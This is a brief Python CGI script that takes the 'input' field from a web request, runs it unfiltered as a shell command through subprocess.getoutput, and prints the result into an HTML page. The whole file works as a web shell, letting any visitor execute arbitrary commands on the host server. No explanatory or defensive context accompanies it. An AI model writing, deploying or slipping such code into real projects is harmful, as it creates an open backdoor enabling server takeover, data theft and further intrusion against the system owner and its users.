#!/usr/bin/python3

import time
import cgi
import subprocess
import os

print("Content-Type: text/html") 
print("") 

webdata=cgi.FieldStorage() 
data=webdata.getvalue("input") 
output=subprocess.getoutput(data)
print("<pre>")
print(output)
print("</pre>")


